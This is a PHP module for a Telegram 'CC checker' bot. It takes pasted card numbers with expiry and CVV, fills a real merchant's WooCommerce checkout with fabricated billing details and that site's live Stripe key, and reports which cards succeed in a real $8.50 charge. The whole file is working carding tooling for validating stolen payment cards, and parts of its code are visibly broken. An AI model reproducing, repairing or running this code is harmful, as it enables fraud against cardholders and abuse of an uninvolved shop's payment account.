<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";


////////////====[MUTE]====////////////
if(strpos($message, "/ch2 ") === 0 || strpos($message, ".ch2 ") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);
        $bin = substr($cc, 0, 6);
        
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mm = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $yy = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
        

##########################################################CHECKER PART#######################################################  

            /////////////////////////////////////////////////////////////////////////////////////
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = capture($fim, '"bank":{"name":"', '"');
            $cname = capture($fim, '"name":"', '"');
            $brand = capture($fim, '"brand":"', '"');
            $country = capture($fim, '"country":{"name":"', '"');
            $phone = capture($fim, '"phone":"', '"');
            $scheme = capture($fim, '"scheme":"', '"');
            $type = capture($fim, '"type":"', '"');
            $emoji = capture($fim, '"emoji":"', '"');
            $currency = capture($fim, '"currency":"', '"');
            $binlenth = strlen($bin);
            $schemename = ucfirst("$scheme");
            $typename = ucfirst("$type");
            
            
            /////////////////////==========[Unavailable if empty]==========////////////////
            
            
            if (empty($schemename)) {
            	$schemename = "Unavailable";
            }
            if (empty($typename)) {
            	$typename = "Unavailable";
            }
            if (empty($brand)) {
            	$brand = "Unavailable";
            }
            if (empty($bank)) {
            	$bank = "Unavailable";
            }
            if (empty($cname)) {
            	$cname = "Unavailable";
            }
            if (empty($phone)) {
            	$phone = "Unavailable";
            }
            ///////////////////////////////////////////////////////////////////////////////////////////////////////
            error_reporting(0);
            ##################################
            if(!is_dir("lawcookies")){
                mkdir("lawcookies", 0755);
            }
            define("capture", getcwd()."/lawcookies/coo".rand(1100, 9999).".txt");
            
            #------[Email Generator]------#
            function emailGenerate($length = 10)
            {
                $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
                $charactersLength = strlen($characters);
                $randomString     = '';
                for ($i = 0; $i < $length; $i++) {
                    $randomString .= $characters[rand(0, $charactersLength - 1)];
                }
                return $randomString . '@gmail.com';
            }
            $email = emailGenerate();
            ##################################
            $curl = curl_init();
            curl_setopt_array($curl, [
               CURLOPT_URL => 'https://random-data-api.com/api/users/random_user',
               CURLOPT_CUSTOMREQUEST => 'GET',
               CURLOPT_FOLLOWLOCATION => 1,
               CURLOPT_RETURNTRANSFER => 1,
               CURLOPT_SSL_VERIFYPEER => 0,
               CURLOPT_SSL_VERIFYHOST => 0,
            ]);
            $exe = curl_exec($curl);
            $fname = json_decode($exe, true)['first_name'];
            $lname = json_decode($exe, true)['last_name'];
            $address = json_decode($exe, true)['address']['street_address'];
            $city = json_decode($exe, true)['address']['city'];
            $location_state = json_decode($exe, true)['address']['state'];
            $postcode = json_decode($exe, true)['address']['zip_code'];
            if(strpos($postcode, '-')){
                $postcode = explode("-", $postcode);
                $postcode = $postcode[0];
            }
            $phone = ''.rand(111, 999).'-'.rand(1111111, 9999999).'';
            if ($location_state == "Alabama") {
                $state = "AL";
            } else if ($location_state == "Alaska") {
                $state = "AK";
            } else if ($location_state == "Arizona") {
                $state = "AR";
            } else if ($location_state == "California") {
                $state = "CA";
            } else if ($location_state == "Colorado") {
                $state = "CO";
            } else if ($location_state == "Connecticut") {
                $state = "CT";
            } else if ($location_state == "Delaware") {
                $state = "DE";
            } else if ($location_state == "District of columbia") {
                $state = "DC";
            } else if ($location_state == "Florida") {
                $state = "FL";
            } else if ($location_state == "Georgia") {
                $state = "GA";
            } else if ($location_state == "Hawaii") {
                $state = "HI";
            } else if ($location_state == "Idaho") {
                $state = "ID";
            } else if ($location_state == "Illinois") {
                $state = "IL";
            } else if ($location_state == "Indiana") {
                $state = "IN";
            } else if ($location_state == "Iowa") {
                $state = "IA";
            } else if ($location_state == "Kansas") {
                $state = "KS";
            } else if ($location_state == "Kentucky") {
                $state = "KY";
            } else if ($location_state == "Louisiana") {
                $state = "LA";
            } else if ($location_state == "Maine") {
                $state = "ME";
            } else if ($location_state == "Maryland") {
                $state = "MD";
            } else if ($location_state == "Massachusetts") {
                $state = "MA";
            } else if ($location_state == "Michigan") {
                $state = "MI";
            } else if ($location_state == "Minnesota") {
                $state = "MN";
            } else if ($location_state == "Mississippi") {
                $state = "MS";
            } else if ($location_state == "Missouri") {
                $state = "MO";
            } else if ($location_state == "Montana") {
                $state = "MT";
            } else if ($location_state == "Nebraska") {
                $state = "NE";
            } else if ($location_state == "Nevada") {
                $state = "NV";
            } else if ($location_state == "Wyoming") {
                $state = "WY";
            } else {
                $state = "KY";
            }
            
            
            ////////////////////////////////////////////
            
            $curl = curl_init();
            $headers = array();
            $headers[] = 'authority: www.animalcontrolproducts.com';
            $headers[] = 'method: GET';
            $headers[] = 'path: /product/victor-mouse-glue-trap/';
            $headers[] = 'scheme: https';
            $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
            $headers[] = 'accept-language: en-US,en;q=0.9';
            $headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
            $headers[] = 'sec-ch-ua-mobile: ?0';
            $headers[] = 'sec-ch-ua-platform: "Windows"';
            $headers[] = 'sec-fetch-dest: document';
            $headers[] = 'sec-fetch-mode: navigate';
            $headers[] = 'sec-fetch-site: none';
            $headers[] = 'sec-fetch-user: ?1';
            $headers[] = 'upgrade-insecure-requests: 1';
            $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
            
            curl_setopt_array($curl, [
               CURLOPT_URL => 'https://www.animalcontrolproducts.com/product/victor-mouse-glue-trap/',
               CURLOPT_CUSTOMREQUEST => 'GET',
               CURLOPT_HTTPHEADER => $headers,
               CURLOPT_FOLLOWLOCATION => 1,
               CURLOPT_RETURNTRANSFER => 1,
               CURLOPT_SSL_VERIFYPEER => 0,
               CURLOPT_SSL_VERIFYHOST => 0,
               CURLOPT_COOKIEFILE => capture,
               CURLOPT_COOKIEJAR => capture,
            ]);
            $exe = curl_exec($curl);
            
            ################################
            
                                                
            $curl = curl_init();
            $headers = array();
            $headers[] = 'authority: www.animalcontrolproducts.com';
            $headers[] = 'method: POST';
            $headers[] = 'path: /product/victor-mouse-glue-trap/';
            $headers[] = 'scheme: https';
            $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
            $headers[] = 'accept-language: en-US,en;q=0.9';
            $headers[] = 'cache-control: max-age=0';
            $headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryrwOwOa9IfBc5AZZl';
            $headers[] = 'origin: https://www.animalcontrolproducts.com';
            $headers[] = 'referer: https://www.animalcontrolproducts.com/product/victor-mouse-glue-trap/';
            $headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
            $headers[] = 'sec-ch-ua-mobile: ?0';
            $headers[] = 'sec-ch-ua-platform: "Windows"';
            $headers[] = 'sec-fetch-dest: document';
            $headers[] = 'sec-fetch-mode: navigate';
            $headers[] = 'sec-fetch-site: same-origin';
            $headers[] = 'sec-fetch-user: ?1';
            $headers[] = 'upgrade-insecure-requests: 1';
            $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
            $postfield = '------WebKitFormBoundaryrwOwOa9IfBc5AZZl
            Content-Disposition: form-data; name="quantity"
            
            1
            ------WebKitFormBoundaryrwOwOa9IfBc5AZZl
            Content-Disposition: form-data; name="add-to-cart"
            
            794
            ------WebKitFormBoundaryrwOwOa9IfBc5AZZl--';
            
            curl_setopt_array($curl, [
               CURLOPT_URL => 'https://www.animalcontrolproducts.com/product/victor-mouse-glue-trap/',
               CURLOPT_POST => 1,
               CURLOPT_POSTFIELDS => $postfield,
               CURLOPT_HTTPHEADER => $headers,
               CURLOPT_FOLLOWLOCATION => 1,
               CURLOPT_RETURNTRANSFER => 1,
               CURLOPT_SSL_VERIFYPEER => 0,
               CURLOPT_SSL_VERIFYHOST => 0,
               CURLOPT_COOKIEFILE => capture,
               CURLOPT_COOKIEJAR => capture,
            ]);
            $exe2 = curl_exec($curl);
            
            ##################################
            
            $curl = curl_init();
            $headers = array();
            $headers[] = 'authority: www.animalcontrolproducts.com';
            $headers[] = 'method: GET';
            $headers[] = 'path: /cart/';
            $headers[] = 'scheme: https';
            $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
            $headers[] = 'accept-language: en-US,en;q=0.9';
            $headers[] = 'cache-control: max-age=0';
            $headers[] = 'referer: https://www.animalcontrolproducts.com/product/victor-mouse-glue-trap/';
            $headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
            $headers[] = 'sec-ch-ua-mobile: ?0';
            $headers[] = 'sec-ch-ua-platform: "Windows"';
            $headers[] = 'sec-fetch-dest: document';
            $headers[] = 'sec-fetch-mode: navigate';
            $headers[] = 'sec-fetch-site: same-origin';
            $headers[] = 'sec-fetch-user: ?1';
            $headers[] = 'upgrade-insecure-requests: 1';
            $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
            
            curl_setopt_array($curl, [
               CURLOPT_URL => 'https://www.animalcontrolproducts.com/cart/',
               CURLOPT_CUSTOMREQUEST => 'GET',
               CURLOPT_HTTPHEADER => $headers,
               CURLOPT_FOLLOWLOCATION => 1,
               CURLOPT_RETURNTRANSFER => 1,
               CURLOPT_SSL_VERIFYPEER => 0,
               CURLOPT_SSL_VERIFYHOST => 0,
               CURLOPT_COOKIEFILE => capture,
               CURLOPT_COOKIEJAR => capture,
            ]);
            $exe3 = curl_exec($curl);
            
            ##################################
            
            $curl = curl_init();
            $headers = array();
            $headers[] = 'authority: www.animalcontrolproducts.com';
            $headers[] = 'method: GET';
            $headers[] = 'path: /checkout/';
            $headers[] = 'scheme: https';
            $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
            $headers[] = 'accept-language: en-US,en;q=0.9';
            $headers[] = 'referer: https://www.animalcontrolproducts.com/cart/';
            $headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
            $headers[] = 'sec-ch-ua-mobile: ?0';
            $headers[] = 'sec-ch-ua-platform: "Windows"';
            $headers[] = 'sec-fetch-dest: document';
            $headers[] = 'sec-fetch-mode: navigate';
            $headers[] = 'sec-fetch-site: same-origin';
            $headers[] = 'sec-fetch-user: ?1';
            $headers[] = 'upgrade-insecure-requests: 1';
            $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
            
            curl_setopt_array($curl, [
               CURLOPT_URL => 'https://www.animalcontrolproducts.com/checkout/',
               CURLOPT_CUSTOMREQUEST => 'GET',
               CURLOPT_HTTPHEADER => $headers,
               CURLOPT_FOLLOWLOCATION => 1,
               CURLOPT_RETURNTRANSFER => 1,
               CURLOPT_SSL_VERIFYPEER => 0,
               CURLOPT_SSL_VERIFYHOST => 0,
               CURLOPT_COOKIEFILE => capture,
               CURLOPT_COOKIEJAR => capture,
            ]);
            $exe4 = curl_exec($curl);
            $nonce = t(st(g($exe4, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','"')));
            $security = t(st(g($exe4, '"update_order_review_nonce":"','"')));
            ##################################
            
                                                
            $curl = curl_init();
            $headers = array();
            $headers[] = 'authority: www.animalcontrolproducts.com';
            $headers[] = 'method: POST';
            $headers[] = 'path: /?wc-ajax=update_order_review';
            $headers[] = 'scheme: https';
            $headers[] = 'accept: */*';
            $headers[] = 'accept-language: en-US,en;q=0.9';
            $headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
            $headers[] = 'origin: https://www.animalcontrolproducts.com';
            $headers[] = 'referer: https://www.animalcontrolproducts.com/checkout/';
            $headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
            $headers[] = 'sec-ch-ua-mobile: ?0';
            $headers[] = 'sec-ch-ua-platform: "Windows"';
            $headers[] = 'sec-fetch-dest: empty';
            $headers[] = 'sec-fetch-mode: cors';
            $headers[] = 'sec-fetch-site: same-origin';
            $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
            $headers[] = 'x-requested-with: XMLHttpRequest';
            $postfield = 'security='.$security.'&payment_method=stripe_cc&country=US&state=NY&postcode=10080&city=New+York&address=Street+23&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address=Street+23&s_address_2=&has_full_address=true&post_data=billing_first_name%3DHyper%26billing_last_name%3DSlow%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3DStreet%252023%26billing_address_2%3D%26billing_city%3DNew%2520York%26billing_state%3DNY%26billing_postcode%3D10080%26billing_phone%3D%26billing_email%3D%26mailchimp_woocommerce_newsletter%3D1%26shipping_first_name%3D%26shipping_last_name%3D%26shipping_company%3D%26shipping_country%3DUS%26shipping_address_1%3D%26shipping_address_2%3D%26shipping_city%3D%26shipping_state%3DWI%26shipping_postcode%3D%26order_comments%3D%26shipping_method%255B0%255D%3Dflexible_shipping_2_1%26payment_method%3Dstripe_cc%26stripe_cc_token_key%3D%26stripe_cc_payment_intent_key%3D%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D'.$nonce.'%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review&shipping_method%5B0%5D=flexible_shipping_2_1';
            
            curl_setopt_array($curl, [
               CURLOPT_URL => 'https://www.animalcontrolproducts.com/?wc-ajax=update_order_review',
               CURLOPT_POST => 1,
               CURLOPT_POSTFIELDS => $postfield,
               CURLOPT_HTTPHEADER => $headers,
               CURLOPT_FOLLOWLOCATION => 1,
               CURLOPT_RETURNTRANSFER => 1,
               CURLOPT_SSL_VERIFYPEER => 0,
               CURLOPT_SSL_VERIFYHOST => 0,
               CURLOPT_COOKIEFILE => capture,
               CURLOPT_COOKIEJAR => capture,
            ]);
            $exe5 = curl_exec($curl);
            
            #######################################
            
            $curl = curl_init();
            $headers = array();
            $headers[] = 'authority: api.stripe.com';
            $headers[] = 'method: POST';
            $headers[] = 'path: /v1/payment_methods';
            $headers[] = 'scheme: https';
            $headers[] = 'accept: application/json';
            $headers[] = 'accept-language: en-US,en;q=0.9';
            $headers[] = 'content-type: application/x-www-form-urlencoded';
            $headers[] = 'origin: https://js.stripe.com';
            $headers[] = 'referer: https://js.stripe.com/';
            $headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
            $headers[] = 'sec-ch-ua-mobile: ?0';
            $headers[] = 'sec-ch-ua-platform: "Windows"';
            $headers[] = 'sec-fetch-dest: empty';
            $headers[] = 'sec-fetch-mode: cors';
            $headers[] = 'sec-fetch-site: same-site';
            $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
            $postfield = 'type=card&billing_details[name]=Hyper+Slow&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=Street+23&billing_details[address][postal_code]=10080&billing_details[address][state]=NY&billing_details[email]=levimc%40gmail.com&billing_details[phone]=4135247242&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=419fba21-1f10-43ee-bc1d-8aea3a306dfce5ed02&muid=6ee16854-ce7c-40b7-9a9c-95df30a7c6ba4e902d&sid=c44a74fd-e6fe-4d6e-bf78-1609648241b00ca1de&pasted_fields=number&payment_user_agent=stripe.js%2Fc6f2aaa66%3B+stripe-js-v3%2Fc6f2aaa66&time_on_page=407352&key=pk_live_51IO4umBNnveasp6tMVKpIC0DHJFZbdv3iDM3p7T7mwaxDFyunjJKDAD6OCQAuBhdwcE6pNOZF5NnP8iGozKr7X4u00Z5cQTVcD&_stripe_account=acct_1IO4umBNnveasp6t';
            
            curl_setopt_array($curl, [
               CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
               CURLOPT_POST => 1,
               CURLOPT_POSTFIELDS => $postfield,
               CURLOPT_HTTPHEADER => $headers,
               CURLOPT_FOLLOWLOCATION => 1,
               CURLOPT_RETURNTRANSFER => 1,
               CURLOPT_SSL_VERIFYPEER => 0,
               CURLOPT_SSL_VERIFYHOST => 0,
               CURLOPT_COOKIEFILE => capture,
               CURLOPT_COOKIEJAR => capture,
            ]);
            $exe6 = curl_exec($curl);
            $id = t(st(g($exe6, '"id": "','"')));
            
            ##################################
            
            $curl = curl_init();
            $headers = array();
            $headers[] = 'authority: www.animalcontrolproducts.com';
            $headers[] = 'method: POST';
            $headers[] = 'path: /?wc-ajax=checkout';
            $headers[] = 'scheme: https';
            $headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
            $headers[] = 'accept-language: en-US,en;q=0.9';
            $headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
            $headers[] = 'origin: https://www.animalcontrolproducts.com';
            $headers[] = 'referer: https://www.animalcontrolproducts.com/checkout/';
            $headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
            $headers[] = 'sec-ch-ua-mobile: ?0';
            $headers[] = 'sec-ch-ua-platform: "Windows"';
            $headers[] = 'sec-fetch-dest: empty';
            $headers[] = 'sec-fetch-mode: cors';
            $headers[] = 'sec-fetch-site: same-origin';
            $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
            $headers[] = 'x-requested-with: XMLHttpRequest';
            $postfield = 'billing_first_name=Hyper&billing_last_name=Slow&billing_company=&billing_country=US&billing_address_1=Street+23&billing_address_2=&billing_city=New+York&billing_state=NY&billing_postcode=10080&billing_phone=4135247242&billing_email=levimc%40gmail.com&mailchimp_woocommerce_newsletter=1&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=WI&shipping_postcode=&order_comments=&shipping_method%5B0%5D=flexible_shipping_2_1&payment_method=stripe_cc&stripe_cc_token_key='.$id.'&stripe_cc_payment_intent_key=&terms=on&terms-field=1&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review';
            
            curl_setopt_array($curl, [
               CURLOPT_URL => 'https://www.animalcontrolproducts.com/?wc-ajax=checkout',
               CURLOPT_POST => 1,
               CURLOPT_POSTFIELDS => $postfield,
               CURLOPT_HTTPHEADER => $headers,
               CURLOPT_FOLLOWLOCATION => 1,
               CURLOPT_RETURNTRANSFER => 1,
               CURLOPT_SSL_VERIFYPEER => 0,
               CURLOPT_SSL_VERIFYHOST => 0,
               CURLOPT_COOKIEFILE => capture,
               CURLOPT_COOKIEJAR => capture,
            ]);
            $exe7 = curl_exec($curl);
            $msg = st(json_decode($exe7, 1)['messages']);
            $url1 = t(st(g($exe7, '"redirect":"','"')));
            $url = stripslashes("$url1");
            $url69 = t(st(g($url1,'#response=','')));
            $repo = json_decode("$url69");
            $info = curl_getinfo($ch);
            $time = $info['total_time'];
            $time = substr_replace($time, '',4);
######################END OF CHECKER PART################################################################################
            
            
            if(strpos($exe7, '#response=')) {
              addTotal();
              addUserTotal($userId);
              addCVV();
              addUserCVV($userId);
              addCCN();
              addUserCCN($userId);
              bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                  'text'=>"<b>Card:</b> <code>$lista</code>
  <b>Status -» Dead ❌
  Response -» EXPIRED CARD OR SOMEOTHER SHIT
  Gateway -» Stripe 8.50$ Chrg
  Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Arceus69_Xd'>[ ＡＲＣ Σ ＵＳ </Oғғʟɪɴᴇ> ]</a></b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);}
            
            elseif(strpos($exe7, 'The card has insufficient funds to complete the purchase.')) {
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>Card:</b> <code>$lista</code>
    <b>Status -» CVV Matched [Credit Floor] ✅
    Response -» Approved (Insufficient Funds)
    Gateway -» Stripe 8.50$ Chrg
    Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>
  <b>Bank -»</b> $bank
  <b>Brand -»</b> $schemename
  <b>Type -»</b> $typename
  <b>Currency -»</b> $currency
  <b>Country -»</b> $cname ($emoji - 💲$currency)
  <b>Issuers Contact -»</b> $phone
  <b>----------------------------</b>
  
  <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
  <b>Bot By: <a href='t.me/Arceus69_Xd'>[ ＡＲＣ Σ ＵＳ </Oғғʟɪɴᴇ> ]</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}
              elseif((substr_count($exe7, '"result":"success"') > 0) || (substr_count($exe7, '"redirect":"https"'))){
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>Card:</b> <code>$lista</code>
    <b>Status -» CVV Matched [PAYMENT SUCCESS] ✅
    Response -» Approved (CHARGED 8.50$)
    Gateway -» Stripe 8.50$ Chrg
    Response -» Proxy ($ip)
    Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>
  <b>Bank -»</b> $bank
  <b>Brand -»</b> $schemename
  <b>Type -»</b> $typename
  <b>Currency -»</b> $currency
  <b>Country -»</b> $cname ($emoji - 💲$currency)
  <b>Issuers Contact -»</b> $phone
  <b>----------------------------</b>
  
  <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
  <b>Bot By: <a href='t.me/Mabidax_The_Lost_Noob'>Mabidax</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}

              else{
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  'text'=>"<b>Card:</b> <code>$lista</code>
  <b>Status -» Dead ❌
  Response -» Card Was Declined
  Gateway -» Stripe 8.50$ Chrg
  Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>
  <b>Bank -»</b> $bank
  <b>Brand -»</b> $schemename
  <b>Type -»</b> $typename
  <b>Currency -»</b> $currency
  <b>Country -»</b> $cname ($emoji - 💲$currency)
  <b>Issuers Contact -»</b> $phone
  <b>----------------------------</b>
  
  <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
  <b>Bot By: <a href='t.me/Mabidax_The_Lost_Noob'>Mabidax</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}
            
        }else{
          bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"<b>Cool! Fucking provide a CC to Check!!</b>",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              
          ]);
      }
    }
}


?>